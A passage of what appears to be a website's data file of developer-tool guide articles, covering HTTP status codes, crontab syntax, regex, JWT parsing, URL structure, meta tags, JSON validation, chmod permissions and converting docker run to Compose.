A generic error indicating the server encountered an unexpected condition. The catchall for unhandled server exceptions.

### 502 Bad Gateway
The server was acting as a gateway and received an invalid response from an upstream server. Common when a load balancer cannot reach the application server.

### 503 Service Unavailable
The server is temporarily unable to handle the request due to overload or maintenance. The response may include a Retry-After header.

### 504 Gateway Timeout
The server was acting as a gateway and did not receive a timely response from an upstream server.

## Status Codes in REST API Design

Well-designed REST APIs use status codes meaningfully:

\`\`\`
GET /users/123     -> 200 (found) or 404 (not found)
POST /users        -> 201 (created) or 400 (invalid input) or 409 (duplicate)
PUT /users/123     -> 200 (updated) or 404 (not found) or 422 (validation failed)
DELETE /users/123  -> 204 (deleted) or 404 (not found)
GET /protected     -> 401 (not authenticated) or 403 (not authorized)
\`\`\`

## Debugging Tips

When debugging HTTP issues, check:
1. The status code class (4xx = your problem, 5xx = their problem)
2. The response body for error details (APIs usually include error messages)
3. Response headers (Location for redirects, WWW-Authenticate for auth, Retry-After for rate limits)
4. Network timing (slow 200s may indicate performance issues)

-> Try the [HTTP Status Codes Reference](/http-status-codes)`,
  },
  {
    slug: 'crontab-generator-guide',
    toolPath: '/crontab-generator',
    title: 'Crontab Syntax Explained: Schedule Cron Jobs Like a Pro',
    description: 'Master crontab scheduling syntax with our visual generator. Learn how to write cron expressions for any schedule.',
    keywords: ['crontab generator', 'cron syntax', 'cron job', 'cron expression', 'schedule task linux'],
    category: 'Web',
    publishedAt: '2025-06-30',
    content: `## What Is a Cron Job?

A cron job is a scheduled task that runs automatically at specified intervals on Unix-like operating systems. The name comes from "chronos" (Greek for time). Cron is the system service; crontab (cron table) is the file where scheduled tasks are defined.

Cron is used for: automated backups, database maintenance, sending scheduled emails, generating reports, cleaning temporary files, updating caches, and any repetitive task that needs to run without human intervention.

## The Crontab Syntax

A crontab entry has six fields:

\`\`\`
* * * * * command_to_execute
│ │ │ │ │
│ │ │ │ └── Day of week (0-7, where 0 and 7 = Sunday)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)
\`\`\`

## Special Characters

| Character | Meaning | Example |
|---|---|---|
| \`*\` | Any value (wildcard) | \`* * * * *\` runs every minute |
| \`,\` | Value list | \`1,15,30\` means at 1st, 15th, 30th |
| \`-\` | Range | \`9-17\` means 9am to 5pm |
| \`/\` | Step values | \`*/15\` means every 15 units |

## Common Cron Schedule Examples

\`\`\`
# Every minute
* * * * * /path/to/script.sh

# Every hour at minute 0
0 * * * * /path/to/script.sh

# Every day at midnight
0 0 * * * /path/to/script.sh

# Every day at 2:30 AM
30 2 * * * /path/to/script.sh

# Every Monday at 9 AM
0 9 * * 1 /path/to/script.sh

# Every weekday at 6 PM
0 18 * * 1-5 /path/to/script.sh

# Every 15 minutes
*/15 * * * * /path/to/script.sh

# First day of every month at midnight
0 0 1 * * /path/to/script.sh

# Every Sunday at 3 AM (for weekly maintenance)
0 3 * * 0 /path/to/backup.sh

# Twice daily at 8 AM and 8 PM
0 8,20 * * * /path/to/script.sh
\`\`\`

## Special Predefined Schedules

Most cron implementations support shorthand keywords:

| Keyword | Equivalent | Description |
|---|---|---|
| \`@reboot\` | (none) | Once at startup |
| \`@yearly\` | \`0 0 1 1 *\` | Once a year (Jan 1 midnight) |
| \`@annually\` | \`0 0 1 1 *\` | Same as @yearly |
| \`@monthly\` | \`0 0 1 * *\` | Once a month (1st, midnight) |
| \`@weekly\` | \`0 0 * * 0\` | Once a week (Sunday midnight) |
| \`@daily\` | \`0 0 * * *\` | Once a day (midnight) |
| \`@midnight\` | \`0 0 * * *\` | Same as @daily |
| \`@hourly\` | \`0 * * * *\` | Once an hour |

## Managing Crontab

\`\`\`bash
# View current user's crontab
crontab -l

# Edit crontab in default editor
crontab -e

# Remove all cron jobs for current user
crontab -r

# Edit another user's crontab (requires root)
sudo crontab -u username -e

# List another user's crontab
sudo crontab -u username -l
\`\`\`

## Cron Environment and Common Pitfalls

Cron jobs run in a minimal environment - the PATH, HOME, and other variables you rely on in your shell may not be available.

**PATH issues**: Specify full paths to executables:
\`\`\`
# Bad - 'python' may not be found
0 2 * * * python /opt/scripts/backup.py

# Good - use full path
0 2 * * * /usr/bin/python3 /opt/scripts/backup.py
\`\`\`

**Output redirection**: By default, cron emails output to the system user. Redirect output to a log file:
\`\`\`
0 2 * * * /opt/scripts/backup.sh >> /var/log/backup.log 2>&1
\`\`\`

**Timezone**: Cron uses the system timezone. If your server is in UTC but you want jobs at "local" times, account for the offset.

**Missed jobs**: If the server is down when a job should run, the job is skipped - it does not catch up when the server restarts (unless you use \`anacron\`).

## Using This Tool

Enter your desired schedule in plain English or fill in the time fields, and the tool generates the correct crontab expression. You can also paste a crontab expression to see a human-readable description.

-> Try the [Crontab Generator](/crontab-generator)`,
  },
  {
    slug: 'regex-tester-guide',
    toolPath: '/regex-tester',
    title: 'Regular Expressions Guide: Write, Test, and Debug Regex Online',
    description: 'Learn regex syntax from basics to advanced. Test your expressions instantly and avoid common pitfalls.',
    keywords: ['regex tester', 'regular expressions', 'regex online', 'regex patterns', 'regex tutorial'],
    category: 'Web',
    publishedAt: '2025-07-01',
    content: `## What Is a Regular Expression?

A regular expression (regex or regexp) is a sequence of characters that defines a search pattern. Regular expressions are used for searching, matching, validating, and transforming text. They are supported in virtually every programming language and many text editors.

Despite their cryptic appearance, regular expressions follow consistent rules. Once you learn the syntax, you can apply it across Python, JavaScript, Java, Perl, Ruby, and dozens of other languages.

## Basic Regex Syntax

### Literal Characters
Most characters match themselves: \`cat\` matches the string "cat".

### Metacharacters
Special characters have special meaning and must be escaped with backslash to match literally:
\`\`\`
. ^ $ * + ? { } [ ] \\\\ | ( )
\`\`\`

### The Dot: Any Character
\`.\` matches any single character except newline:
\`\`\`
c.t  matches: cat, cot, cut, c4t, c.t
     doesn't match: cart (two chars between c and t)
\`\`\`

### Character Classes
\`[abc]\` matches any single character a, b, or c:
\`\`\`
[aeiou]     matches any vowel
[a-z]       matches any lowercase letter
[A-Za-z0-9] matches any alphanumeric character
[^aeiou]    matches any non-vowel (^ negates inside [])
\`\`\`

### Quantifiers
Control how many times the preceding element must match:

| Quantifier | Meaning |
|---|---|
| \`*\` | Zero or more times |
| \`+\` | One or more times |
| \`?\` | Zero or one time (optional) |
| \`{3}\` | Exactly 3 times |
| \`{2,5}\` | Between 2 and 5 times |
| \`{3,}\` | 3 or more times |

### Shorthand Character Classes

| Shorthand | Equivalent | Meaning |
|---|---|---|
| \`\\d\` | \`[0-9]\` | Any digit |
| \`\\D\` | \`[^0-9]\` | Any non-digit |
| \`\\w\` | \`[a-zA-Z0-9_]\` | Any word character |
| \`\\W\` | \`[^a-zA-Z0-9_]\` | Any non-word character |
| \`\\s\` | \`[ \\t\\n\\r\\f\\v]\` | Any whitespace |
| \`\\S\` | \`[^ \\t\\n\\r\\f\\v]\` | Any non-whitespace |

### Anchors

| Anchor | Meaning |
|---|---|
| \`^\` | Start of string (or line with multiline flag) |
| \`$\` | End of string (or line with multiline flag) |
| \`\\b\` | Word boundary |
| \`\\B\` | Non-word boundary |

### Groups and Alternation

\`(abc)\` captures the matched text in a group:
\`\`\`
(\\d{4})-(\\d{2})-(\\d{2})  matches and captures a date like 2025-06-15
\`\`\`

\`|\` provides alternation (OR):
\`\`\`
cat|dog  matches "cat" or "dog"
(cat|dog)s  matches "cats" or "dogs"
\`\`\`

## Practical Regex Examples

\`\`\`
Email validation (simplified):
[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}

URL detection:
https?://[^\\s<>"{}|\\\\^\`\\[\\]]+

IP address (basic):
\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b

Phone number (US):
\\+?1?\\s?(\\d{3}[\\s.-]?)?\\d{3}[\\s.-]?\\d{4}

Date (YYYY-MM-DD):
\\d{4}-(0[1-9]|1[0-2])-(0[1-9]|[12]\\d|3[01])

Hex color code:
#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})

Password (8+ chars, uppercase, lowercase, digit):
^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d).{8,}$
\`\`\`

## Lookahead and Lookbehind

**Lookahead** matches a position where a pattern follows (without including it):
\`\`\`
\\d+(?= dollars)  matches "100" in "100 dollars" but not "100 euros"
\`\`\`

**Negative lookahead** matches where a pattern does NOT follow:
\`\`\`
\\b\\w+\\b(?! are)  matches words not followed by " are"
\`\`\`

**Lookbehind** matches a position preceded by a pattern:
\`\`\`
(?<=\\$)\\d+  matches "100" in "$100"
\`\`\`

## Regex Flags

| Flag | JavaScript | Python | Meaning |
|---|---|---|---|
| Global | \`g\` | (not needed) | Find all matches, not just first |
| Case insensitive | \`i\` | \`re.IGNORECASE\` | Match regardless of case |
| Multiline | \`m\` | \`re.MULTILINE\` | ^ and $ match line boundaries |
| Dotall | \`s\` | \`re.DOTALL\` | . matches newlines too |

## Using This Tool

Enter your regular expression and test string to see which parts match, highlighted in real time. Supports JavaScript regex syntax with flags (g, i, m, s). Great for building and debugging patterns before using them in code.

-> Try the [Regex Tester](/regex-tester)`,
  },
  {
    slug: 'jwt-parser-web-guide',
    toolPath: '/jwt-parser',
    title: 'How to Parse and Debug JWT Tokens',
    description: 'Use our online JWT parser to decode, inspect, and debug JSON Web Tokens without any server-side code.',
    keywords: ['JWT debug', 'parse JWT online', 'inspect JWT', 'JWT decode', 'JWT claims viewer'],
    category: 'Web',
    publishedAt: '2025-07-02',
    content: `## Quick JWT Reference

JSON Web Tokens (JWT) are compact, self-contained tokens used for authentication and information exchange. This guide covers the essential reference information for working with JWTs.

## JWT Structure At A Glance

\`\`\`
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│──────────────────────────────────────│──────────────────────────────────────────────────────│──────────────────────────────────────────────────│
               Header                                      Payload                                                Signature
\`\`\`

Each section is Base64URL encoded and separated by dots.

## Standard JWT Claims

| Claim | Name | Type | Description |
|---|---|---|---|
| \`iss\` | Issuer | String | Who issued the token |
| \`sub\` | Subject | String | Token subject (usually user ID) |
| \`aud\` | Audience | String/Array | Who the token is for |
| \`exp\` | Expiration | Number | Unix timestamp when it expires |
| \`nbf\` | Not Before | Number | Unix timestamp before which it's invalid |
| \`iat\` | Issued At | Number | Unix timestamp when issued |
| \`jti\` | JWT ID | String | Unique token identifier |

## Common Signing Algorithms

| Algorithm | Type | Description |
|---|---|---|
| HS256 | Symmetric | HMAC with SHA-256. Same secret for signing and verification. Simple but requires sharing the secret. |
| HS384 | Symmetric | HMAC with SHA-384. Stronger than HS256. |
| HS512 | Symmetric | HMAC with SHA-512. Strongest HMAC variant. |
| RS256 | Asymmetric | RSA with SHA-256. Private key signs, public key verifies. |
| RS384 | Asymmetric | RSA with SHA-384. |
| RS512 | Asymmetric | RSA with SHA-512. |
| ES256 | Asymmetric | ECDSA with P-256. Smaller keys than RSA. |
| PS256 | Asymmetric | RSA-PSS with SHA-256. More secure than RS256. |
| EdDSA | Asymmetric | Ed25519. Modern, fast, secure. |

## How to Verify a JWT

\`\`\`javascript
// Node.js - using jsonwebtoken
const jwt = require('jsonwebtoken');

// Verify with symmetric secret
try {
  const decoded = jwt.verify(token, 'your-secret-key');
  console.log(decoded.sub, decoded.exp);
} catch (err) {
  // TokenExpiredError, JsonWebTokenError, NotBeforeError
}

// Verify with public key (RS256)
const publicKey = fs.readFileSync('public.pem');
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
\`\`\`

\`\`\`python
# Python - using PyJWT
import jwt

decoded = jwt.decode(token, secret, algorithms=["HS256"])
\`\`\`

## JWT Security Checklist

Always verify the signature on the server before trusting any claims. Check the \`exp\` claim and reject expired tokens. Specify allowed algorithms explicitly to prevent algorithm confusion attacks. Never store sensitive data in the payload since it is only Base64 encoded, not encrypted. Use short expiry times (15-60 minutes for access tokens) combined with refresh tokens. Implement token revocation via a blocklist if needed. Use HTTPS to prevent token interception. Store tokens in HttpOnly cookies or memory, not localStorage, to reduce XSS risk.

## Decoding Without Verification

Sometimes you need to read claims from a JWT without verifying (for example, to check expiry before making a network call to refresh):

\`\`\`javascript
// WARNING: Do NOT use for security decisions
const parts = token.split('.');
const payload = JSON.parse(atob(parts[1]));
console.log(payload.exp);  // Unix timestamp
\`\`\`

This is safe only for display purposes or pre-verification checks.

## JWT vs Session Tokens

Sessions store state on the server (in a database or Redis) and give the client only an opaque ID. JWTs embed state directly in the token, making the server stateless. This makes JWTs excellent for microservices and distributed systems where every service can verify tokens independently using a public key, without making database calls.

The tradeoff is that JWTs are harder to revoke: you cannot invalidate a signed JWT before its expiry without maintaining a server-side blocklist (which partially negates the stateless benefit).

## Using This Tool

Paste any JWT to instantly decode and inspect the header, payload, and signature. The tool shows:
- Algorithm and token type from the header
- All claims with human-readable timestamps for numeric dates
- Expiry status (valid, expired, or time remaining)
- Raw Base64URL-decoded content of each section

-> Try the [JWT Parser](/jwt-parser)`,
  },
  {
    slug: 'url-parser-guide',
    toolPath: '/url-parser',
    title: 'URL Structure Explained: Parse and Understand Any URL',
    description: 'Learn the anatomy of a URL: protocol, host, port, path, query string, and fragment. Parse any URL instantly.',
    keywords: ['URL parser', 'URL structure', 'parse URL', 'URL anatomy', 'query string'],
    category: 'Web',
    publishedAt: '2025-07-03',
    content: `## What Is a URL?

A URL (Uniform Resource Locator) is a reference to a web resource that specifies its location and the mechanism for retrieving it. Every URL follows a standardized structure defined in RFC 3986.

Understanding URL structure is fundamental for web development, API design, security analysis, and debugging network issues.

## The Anatomy of a URL

\`\`\`
https://user:password@www.example.com:8080/path/to/page?key=value&foo=bar#section
│─────││───────────────────────────││──││─────────────││────────────││──────│
scheme     authority (userinfo+host+port)    path         query      fragment
\`\`\`

Breaking it down:

| Component | Example | Purpose |
|---|---|---|
| Scheme | \`https\` | Protocol to use (http, https, ftp, mailto, file) |
| User Info | \`user:password\` | Optional credentials (rarely used, insecure) |
| Host | \`www.example.com\` | Domain name or IP address |
| Port | \`8080\` | Network port (omit for defaults: 80=HTTP, 443=HTTPS) |
| Path | \`/path/to/page\` | Location of the resource on the server |
| Query | \`key=value&foo=bar\` | Additional parameters (key-value pairs) |
| Fragment | \`#section\` | Client-side anchor (never sent to server) |

## URL Schemes

| Scheme | Protocol | Example |
|---|---|---|
| \`http\` | Hypertext Transfer | \`http://example.com\` |
| \`https\` | Secure HTTP | \`https://example.com\` |
| \`ftp\` | File Transfer | \`ftp://files.example.com\` |
| \`mailto\` | Email | \`mailto:user@example.com\` |
| \`file\` | Local file | \`file:///home/user/doc.txt\` |
| \`ws\` | WebSocket | \`ws://chat.example.com/socket\` |
| \`wss\` | Secure WebSocket | \`wss://chat.example.com/socket\` |
| \`data\` | Inline data | \`data:text/plain;base64,SGVsbG8=\` |

## Absolute vs Relative URLs

**Absolute URLs** contain the full specification including scheme and host:
\`\`\`
https://www.example.com/about
\`\`\`

**Relative URLs** are resolved relative to a base URL:
\`\`\`
/about              -> absolute path from root
../images/logo.png  -> relative to current directory
?page=2             -> same path, different query
#section-2          -> same page, different fragment
\`\`\`

## Query String Parsing

Query strings encode key-value pairs after the \`?\`. Multiple pairs are separated by \`&\`. Special characters must be percent-encoded.

\`\`\`javascript
// Parse URL in JavaScript
const url = new URL('https://example.com/search?q=hello world&page=2');

url.hostname       // 'example.com'
url.pathname       // '/search'
url.search         // '?q=hello%20world&page=2'
url.searchParams.get('q')    // 'hello world' (auto-decoded)
url.searchParams.get('page') // '2'

// Build URL with query params
const url2 = new URL('https://api.example.com/users');
url2.searchParams.set('limit', '20');
url2.searchParams.set('sort', 'name');
url2.toString() // 'https://api.example.com/users?limit=20&sort=name'
\`\`\`

## URL Normalization

The same resource can be referenced by multiple URL forms. Normalization converts URLs to a canonical form:

\`\`\`
http://Example.COM/index.html    ->  http://example.com/index.html  (lowercase host)
http://example.com:80/page       ->  http://example.com/page        (remove default port)
http://example.com/a/../b/./c   ->  http://example.com/b/c         (resolve path)
http://example.com/page?b=2&a=1 ->  http://example.com/page?a=1&b=2 (sort params)
\`\`\`

## URL Security Considerations

**Open redirects**: If your application uses a URL parameter to redirect users, validate it strictly. \`https://yourapp.com/login?next=https://evil.com\` can redirect to a phishing site.

**URL injection**: URLs in SQL queries or log files can contain payloads. Always validate and encode URLs from user input.

**Fragment-based attacks**: The URL fragment (\`#hash\`) is never sent to the server, making it invisible to server-side security controls. Be careful with client-side routing that uses fragments.

**Punycode homograph attacks**: \`аpple.com\` (Cyrillic \`a\`) looks identical to \`apple.com\` (Latin \`a\`) in some fonts. Always display decoded, normalized URLs to users.

## Using This Tool

Paste any URL to instantly parse and display each component separately: scheme, host, port, path, query parameters (displayed as a table), and fragment. Useful for debugging complex URLs, extracting query parameters, and understanding URL structure.

-> Try the [URL Parser](/url-parser)`,
  },
  {
    slug: 'meta-tag-generator-guide',
    toolPath: '/og-meta-generator',
    title: 'Open Graph Meta Tags: How to Control Social Media Previews',
    description: 'Generate Open Graph and Twitter Card meta tags to control how your page appears when shared on social media.',
    keywords: ['Open Graph meta tags', 'og:image', 'meta tag generator', 'social media preview', 'Twitter card'],
    category: 'Web',
    publishedAt: '2025-07-04',
    content: `## What Are Meta Tags?

Meta tags are HTML elements that provide metadata about a webpage. They sit inside the \`<head>\` section and are invisible to visitors but critical for search engines, social platforms, and browsers. The right meta tags can dramatically improve click-through rates, social sharing appearance, and overall SEO performance.

## Why Meta Tags Matter for SEO

Search engines use meta tags to understand page content and display results. A compelling **title tag** and **meta description** directly influence whether users click your listing. Studies show that optimizing these two elements alone can increase click-through rates by 30% or more.

Social platforms like Facebook, Twitter, and LinkedIn use **Open Graph** and **Twitter Card** tags to control how links appear when shared, including the image, title, and description displayed in previews.

## Essential Meta Tags Explained

### Title Tag
The most important SEO element. Keep it under 60 characters, include your primary keyword near the beginning, and make it compelling for human readers.

### Meta Description
Appears below your title in search results. Aim for 150-160 characters, include a call to action, and naturally incorporate keywords. This doesn't directly affect rankings but strongly impacts click-through rates.

### Robots Meta Tag
Controls search engine crawler behavior. Use \`noindex\` for admin pages, thank-you pages, or duplicate content.

### Canonical URL
Prevents duplicate content penalties by telling search engines which URL is the "official" version of a page.

## Open Graph Tags (Facebook, LinkedIn)

Open Graph tags control social media link previews. Required fields:
- \`og:title\` — Title for social sharing
- \`og:description\` — Short description (150-200 chars)
- \`og:image\` — Preview image (recommended: 1200x630px)
- \`og:url\` — Canonical URL of the page
- \`og:type\` — Content type (article, website, product)

**Image specifications:**
- Recommended size: 1200 x 630 pixels
- Minimum size: 600 x 315 pixels
- File formats: JPG, PNG, GIF
- Maximum file size: 8MB

## Twitter Card Tags

Twitter Card types:
- \`summary\` — Small thumbnail with text
- \`summary_large_image\` — Large image preview (most common)
- \`app\` — App install card
- \`player\` — Video/audio player

Key tags: \`twitter:card\`, \`twitter:title\`, \`twitter:description\`, \`twitter:image\`, \`twitter:site\`

## Structured Data with JSON-LD

Beyond meta tags, JSON-LD structured data helps search engines understand content context. Common schema types include \`Article\`, \`Product\`, \`Recipe\`, \`FAQPage\`, \`LocalBusiness\`, and \`BreadcrumbList\`.

Structured data can unlock **rich snippets** in search results — star ratings, recipe info, event dates, and FAQ dropdowns — dramatically increasing click-through rates.

## Meta Tag Best Practices

1. **Each page gets unique tags** — Never duplicate titles or descriptions across pages
2. **Match search intent** — Align your title and description with what searchers actually want
3. **Include primary keyword naturally** — Don't stuff keywords; write for humans first
4. **Test social previews** — Use Facebook Debugger and Twitter Card Validator
5. **Keep lengths optimal** — Title: 50-60 chars, Description: 150-160 chars
6. **Update OG images seasonally** — Fresh images can revitalize social sharing
7. **Use absolute URLs** — Always use full URLs in canonical and OG tags

## Common Mistakes to Avoid

- **Missing meta descriptions**: Pages without descriptions get auto-generated snippets which often look poor in search results
- **Wrong image dimensions**: Social platforms crop images to specific ratios; wrong sizes lead to ugly previews
- **Forgetting mobile viewport**: Without the viewport meta tag, mobile users see a desktop-scaled page
- **Duplicate titles site-wide**: Identical titles confuse search engines and waste ranking potential
- **Omitting canonical on paginated content**: Pagination creates duplicate content issues without canonicals

## Using the Meta Tag Generator

Our meta tag generator creates all the essential tags automatically:

1. Enter your page title and description
2. Add your page URL and author information
3. Select the appropriate content type
4. Upload or link your preview image
5. Copy the generated HTML to your \`<head>\` section

The generator produces properly formatted Open Graph, Twitter Card, and standard SEO meta tags — saving hours of manual configuration and ensuring you don't miss any important elements.

Invest time in meta tags — they're the first thing both search engines and human visitors encounter, and they directly impact your organic search performance and social sharing effectiveness.
`,
  },

  // ─── Development ──────────────────────────────────────────────
  {
    slug: 'json-prettify-and-validate',
    toolPath: '/json-format',
    title: 'How to Format and Validate JSON: A Developer\'s Guide',
    description: 'Learn to format, validate, and debug JSON. Understand common JSON errors and best practices.',
    keywords: ['JSON formatter', 'JSON validator', 'format JSON online', 'JSON pretty print', 'JSON syntax error'],
    category: 'Development',
    publishedAt: '2025-07-08',
    content: `## What Is JSON?

JSON (JavaScript Object Notation) is a lightweight, human-readable data interchange format. Derived from JavaScript object literal syntax, JSON has become the universal standard for data exchange on the web, used in REST APIs, configuration files, and data storage.

JSON supports six data types: strings, numbers, booleans (true/false), null, arrays, and objects. Its simplicity and readability have made it the dominant alternative to XML.

## JSON Syntax Rules

JSON has strict syntax requirements that differ from JavaScript:

1. **Keys must be strings** in double quotes: \`"key": "value"\` (not \`key: "value"\`)
2. **Strings use double quotes only** - no single quotes
3. **No trailing commas**: \`{"a": 1, "b": 2}\` is valid but \`{"a": 1, "b": 2,}\` is not
4. **No comments**: JSON does not support \`//\` or \`/* */\` comments
5. **Numbers cannot have leading zeros**: \`100\` is valid, \`0100\` is not
6. **Special values**: \`true\`, \`false\`, \`null\` (lowercase)

## Common JSON Errors

### Syntax Error: Unexpected token
Usually means a trailing comma, missing comma, or unquoted key:
\`\`\`
Bad:  {"name": "John", "age": 30,}  <- trailing comma
Good: {"name": "John", "age": 30}

Bad:  {name: "John"}  <- unquoted key
Good: {"name": "John"}
\`\`\`

### Unexpected control character
Unescaped special characters inside strings:
\`\`\`
Bad:  {"path": "C:\\Users\\name"}    <- backslash not escaped
Good: {"path": "C:\\\\Users\\\\name"}  <- escaped backslash

Bad:  {"text": "line 1
line 2"}                           <- unescaped newline
Good: {"text": "line 1\\nline 2"}   <- escaped newline
\`\`\`

### Unclosed bracket or brace
Missing closing \`}\` or \`]\`:
\`\`\`
Bad:  [{"id": 1}, {"id": 2]  <- missing }
Good: [{"id": 1}, {"id": 2}]
\`\`\`

## JSON Formatting Levels

**Minified JSON** (single line, no whitespace):
\`\`\`json
{"users":[{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]}
\`\`\`
Best for: API responses, data transmission (smaller size).

**Pretty-printed JSON** (indented, human-readable):
\`\`\`json
{
  "users": [
    {
      "id": 1,
      "name": "Alice"
    },
    {
      "id": 2,
      "name": "Bob"
    }
  ]
}
\`\`\`
Best for: Configuration files, debugging, documentation.

## JSON in Practice

### Parsing JSON in JavaScript
\`\`\`javascript
// Parse (string to object)
const data = JSON.parse('{"name": "Alice", "age": 30}');
console.log(data.name);  // "Alice"

// Stringify (object to string)
const json = JSON.stringify({ name: "Alice", age: 30 });
// '{"name":"Alice","age":30}'

// Pretty print (2-space indent)
const pretty = JSON.stringify(data, null, 2);
\`\`\`

### JSON Schema Validation
JSON Schema defines the expected structure, types, and constraints of JSON data:
\`\`\`json
{
  "type": "object",
  "properties": {
    "name": { "type": "string", "minLength": 1 },
    "age": { "type": "number", "minimum": 0 }
  },
  "required": ["name"]
}
\`\`\`

### Handling Large JSON Files
For large JSON files (>100MB), streaming parsers avoid loading the entire file into memory:
- Node.js: \`stream-json\` package
- Python: \`ijson\` package

## JSON vs Other Formats

| Format | Comments | Binary | Schema | Use Case |
|---|---|---|---|---|
| JSON | No | No | JSON Schema | Web APIs, config |
| YAML | Yes | No | Yes | Config files, DevOps |
| TOML | Yes | No | Limited | Application config |
| XML | Yes | No | XSD | Enterprise, docs |
| MessagePack | N/A | Yes | No | Performance-critical |
| Protocol Buffers | N/A | Yes | Yes | High-performance APIs |

## Using This Tool

Paste any JSON text to instantly validate it and detect errors with specific line/column numbers. The tool pretty-prints valid JSON with configurable indentation (2 spaces, 4 spaces, or tabs) and highlights any syntax errors.

-> Try the [JSON Formatter & Validator](/json-format)`,
  },
  {
    slug: 'chmod-calculator-guide',
    toolPath: '/chmod-calculator',
    title: 'Linux File Permissions Explained: chmod Calculator and Reference',
    description: 'Master Unix file permissions. Learn rwx notation, octal values, and use our chmod calculator.',
    keywords: ['chmod calculator', 'linux permissions', 'chmod octal', 'file permissions unix', 'rwx permissions'],
    category: 'Development',
    publishedAt: '2025-07-09',
    content: `## What Are Unix File Permissions?

Unix file permissions control who can read, write, and execute files and directories. They are a fundamental part of Unix and Linux security, determining which users and groups can access each file.

Every file and directory has three sets of permissions for three categories of users: the owner (user), the group, and others (everyone else).

## The Permission Bits

Each category has three permission bits:

| Symbol | Value | Meaning for Files | Meaning for Directories |
|---|---|---|---|
| \`r\` | 4 | Read the file content | List directory contents |
| \`w\` | 2 | Modify the file | Create/delete files in directory |
| \`x\` | 1 | Execute as a program | Enter the directory (cd) |
| \`-\` | 0 | Permission denied | Permission denied |

## Reading the Permission String

The \`ls -l\` command shows permissions as a 10-character string:

\`\`\`
-rwxr-xr--  owner group  filename
│└──┴──┴──
│  │  │  └── Others: r--, read only (4)
│  │  └───── Group:  r-x, read+execute (5)
│  └──────── Owner:  rwx, full access (7)
└─────────── File type: - (file), d (directory), l (symlink)
\`\`\`

## The Octal Notation

Permissions are most commonly expressed as an octal (base-8) number where each digit represents one category (owner, group, others):

\`\`\`
Permission  Binary  Octal
---         000     0
--x         001     1
-w-         010     2
-wx         011     3
r--         100     4
r-x         101     5
rw-         110     6
rwx         111     7
\`\`\`

So \`chmod 755\` means:
\`\`\`
7 = rwx (owner: full access)
5 = r-x (group: read and execute)
5 = r-x (others: read and execute)
\`\`\`

## Common Permission Patterns

| Octal | Symbolic | Use Case |
|---|---|---|
| 400 | r-------- | Read-only, owner only (private key files) |
| 600 | rw------- | Read/write, owner only (SSH private keys, .env files) |
| 644 | rw-r--r-- | Web files (readable by server, writable by owner) |
| 664 | rw-rw-r-- | Shared team files |
| 700 | rwx------ | Private executable or directory |
| 755 | rwxr-xr-x | Standard executables and public directories |
| 775 | rwxrwxr-x | Shared directory (group can write) |
| 777 | rwxrwxrwx | Anyone can do anything (avoid in production) |

## The chmod Command

\`\`\`bash
# Set permissions with octal notation
chmod 755 script.sh
chmod 644 index.html
chmod 600 ~/.ssh/id_rsa

# Set permissions with symbolic notation
chmod u+x script.sh       # Add execute for owner
chmod g-w shared.txt      # Remove write for group
chmod o=r public.txt      # Set others to read-only
chmod a+r document.pdf    # Add read for all (a = all = ugo)

# Recursive (apply to directory and all contents)
chmod -R 755 /var/www/html
\`\`\`

## Special Permission Bits

Beyond the standard rwx bits, Unix has three special permission bits:

### Setuid (s on owner execute, octal 4000)
Executable runs with the owner's privileges, not the caller's:
\`\`\`
chmod 4755 /usr/bin/sudo
-rwsr-xr-x  (s in owner's execute position)
\`\`\`

### Setgid (s on group execute, octal 2000)
For executables: runs with group's privileges.
For directories: new files inherit the directory's group:
\`\`\`
chmod 2775 /shared/project
drwxrwsr-x
\`\`\`

### Sticky bit (t on others execute, octal 1000)
For directories: only the file owner can delete their own files:
\`\`\`
chmod 1777 /tmp
drwxrwxrwt  (t = sticky bit)
\`\`\`
This is why everyone can write to \`/tmp\` but cannot delete each other's files.

## Default Permissions with umask

The \`umask\` (user file creation mask) determines default permissions for new files. It subtracts from the maximum permissions:

\`\`\`
Default max for files:       666 (rw-rw-rw-)
Default max for directories: 777 (rwxrwxrwx)
Typical umask:               022
Result for files:            644 (666 - 022)
Result for directories:      755 (777 - 022)
\`\`\`

-> Try the [chmod Calculator](/chmod-calculator)`,
  },
  {
    slug: 'docker-compose-from-run-command',
    toolPath: '/docker-run-to-docker-compose-converter',
    title: 'Convert docker run to docker-compose: A Practical Guide',
    description: 'Convert docker run commands to docker-compose.yml. Understand volumes, ports, environment variables.',
    keywords: ['docker run to compose', 'docker-compose converter', 'docker compose yml', 'docker migration'],
    category: 'Development',
    publishedAt: '2025-07-10',
    content: `## From docker run to Docker Compose

Docker Compose is a tool for defining and running multi-container Docker applications. Instead of running long \`docker run\` commands with many flags, you describe your services in a \`docker-compose.yml\` file and manage them all with simple commands.

This guide shows how to convert \`docker run\` commands to Docker Compose format.

## Basic Conversion Example

A typical \`docker run\` command:
\`\`\`bash
docker run -d \\
  --name my-web-app \\
  -p 8080:80 \\
  -e NODE_ENV=production \\
  -e DATABASE_URL=postgres://localhost:5432/mydb \\
  -v /host/data:/app/data \\
  --restart unless-stopped \\
  my-web-app:latest
\`\`\`

The equivalent \`docker-compose.yml\`:
\`\`\`yaml
version: '3.8'
services:
  my-web-app:
    image: my-web-app:latest
    container_name: my-web-app
    ports:
      - "8080:80"
    environment:
      - NODE_ENV=production
      - DATABASE_URL=postgres://localhost:5432/mydb
    volumes:
      - /host/data:/app/data
    restart: unless-stopped
\`\`\`

## Mapping docker run Flags to Compose

| docker run flag | Compose key | Example |
|---|---|---|
| \`--name\` | \`container_name\` | \`container_name: myapp\` |
| \`-p 8080:80\` | \`ports\` | \`- "8080:80"\` |
| \`-e VAR=val\` | \`environment\` | \`- VAR=val\` |
| \`-v /host:/container\` | \`volumes\` | \`- /host:/container\` |
| \`--restart\` | \`restart\` | \`restart: unless-stopped\` |
